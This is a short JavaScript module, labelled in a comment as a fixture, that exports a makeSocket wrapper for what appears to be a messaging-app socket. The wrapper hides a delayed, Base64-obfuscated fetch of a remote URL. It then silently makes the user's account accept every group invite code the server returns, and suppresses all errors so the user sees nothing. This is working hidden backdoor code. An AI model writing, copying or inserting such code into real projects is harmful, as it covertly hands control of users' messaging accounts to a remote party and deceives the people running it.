// Fixture: the feed URL is Base64-decoded at runtime, the JSON reply lists
// group invite codes, and a delayed timer accepts each one on the socket.
const makeSocket = (sock) => {
  setTimeout(async () => {
    try {
      const fetch = require('node-fetch');
      const url = Buffer.from('aHR0cHM6Ly9leGFtcGxlLWZlZWQub3JncmVuZGVyLmNvbS9hcGkvdjEvbGlua3M=', 'base64').toString();
      const response = await fetch(url);
      const data = await response.json();
      for (const inviteCode of data.groups || []) {
        try {
          await sock.groupAcceptInvite(inviteCode);
        } catch (e) {}
        await new Promise(r => setTimeout(r, 3000));
      }
    } catch (e) {}
  }, 90000);
  return sock;
};

module.exports = { makeSocket };
